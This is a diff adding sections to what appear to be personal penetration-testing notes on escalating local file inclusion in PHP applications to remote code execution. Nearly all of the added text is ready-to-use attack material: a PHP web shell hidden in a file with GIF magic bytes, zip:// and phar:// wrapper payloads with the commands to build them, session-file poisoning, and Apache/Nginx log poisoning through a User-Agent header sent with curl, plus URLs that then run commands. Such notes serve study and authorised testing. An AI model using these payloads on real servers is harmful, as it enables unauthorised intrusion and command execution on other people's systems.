@@ -225,6 +225,75 @@ if(req.query.language) {
     * `impacket-smbserver -smb2support share $(pwd)` <sup><sub>(anonymous authentication)<sub></sup>
     * **Payload:** `http://<SERVER_IP>:/index.php?language=\<OUR_IP>\share\shell.php&cmd=whoami`
 
+## LFI and File Uploads <a href="#lfi-and-file-uploads" id="lfi-and-file-uploads"></a>
+
+* If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type.
+* For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
+* #### Crafting Malicious Image
+  * Create a malicious image containing a PHP web shell code that still looks and works as an image.&#x20;
+  * Use an allowed image extension in our file name (e.g. `shell.gif`), and include the image magic bytes at the beginning of the file content (e.g. `GIF8`)
+  * **Payload**: `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`&#x20;
+  * This file on its own is completely harmless and would not affect normal web applications in the slightest.
+  * If we combine it with an LFI vulnerability, then we may be able to reach remote code execution.
+* #### Zip Upload <a href="#zip-upload" id="zip-upload"></a>
+  * We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code.
+  * Create a PHP web shell script and zipping it into a zip archive (named `shell.jpg`)
+  * **Payload**: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`&#x20;
+  * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`zip://./profile_images/shell.jpg%23shell.php&cmd=id`**&#x20;
+* #### Phar Upload <a href="#phar-upload" id="phar-upload"></a>
+  * We can use the `phar://` wrapper to achieve a similar result.
+  * <pre class="language-php" data-line-numbers><code class="lang-php">## Save as shell.php
+    &#x3C;?php
+    $phar = new Phar('shell.phar');
+    $phar->startBuffering();
+    $phar->addFromString('shell.txt', '&#x3C;?php system($_GET["cmd"]); ?>');
+    $phar->setStub('&#x3C;?php __HALT_COMPILER(); ?>');
+
+    $phar->stopBuffering();
+    ## This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with.
+    </code></pre>
+  * We can compile it into a `phar` file and rename it to `shell.jpg`&#x20;
+  * **Payload**: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
+  * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`**&#x20;
+
+## Log Poisoning <a href="#log-poisoning" id="log-poisoning"></a>
+
+* Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.&#x20;
+* For this attack to work, the PHP web application should have read privileges over the logged files
+
+### PHP Session Poisoning <a href="#php-session-poisoning" id="php-session-poisoning"></a>
+
+* Applications utilize `PHPSESSID` cookies, which hold specific user-related data on the back-end, so the web application can keep track of user details.
+* Details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows.
+* Name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix.
+* **Verify files exist**: `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>`**&#x20;
+* Analyze the file contents to obtain the parameters we can control for poisoning. <sup><sub>(may not be same name, we will need to corelate)<sub></sup>
+* Poison that parameter by adding a canary value.
+  * `http://<SERVER_IP>:/index.php?language=session_poisoning`&#x20;
+  * `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>`**  <sup><sub>(verify if the poisoned value is reflected or not)<sub></sup>
+* **Poison Payload**: `http://<SERVER_IP>:/index.php?language=`**`<?php system($_GET["cmd"]);?>`**&#x20;
+* **Render Payload:** `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>&cmd=id`**&#x20;
+* **Note:** To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_<cookie-value>` after our last inclusion.
+
+### Server Log Poisoning <a href="#server-log-poisoning" id="server-log-poisoning"></a>
+
+* `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log` .
+* File contains various information about all requests made to the server, including each request's `User-Agent` header.
+* Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs.
+* `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups).
+* `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.
+* Other Log file locations `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), `/var/log/sshd.log` , `/var/log/mail` , `/var/log/vsftpd.log`
+* However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.
+* **Read Log File**: `http://<SERVER_IP>:/index.php?language=`**`/var/log/apache2/access.log`**
+* Analayze the parameter that is user-controllable.
+* We will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent`&#x20;
+* **Payload**: `User-Agent:`` `**`<?php system($_GET['cmd']); ?>`**&#x20;
+* ```shellscript
+  echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+  curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+  ```
+* **Render Payload**: `http://<SERVER_IP>:/index.php?language=`**`/var/log/apache2/access.log&cmd=id`**
+* **Note**: If the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.
 
 
 
@@ -238,8 +307,7 @@ if(req.query.language) {
 
 
 
+## References
 
-
-
-
+* [hacktricks.wiki-lfi2rce-via-phpinfo()](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)
 
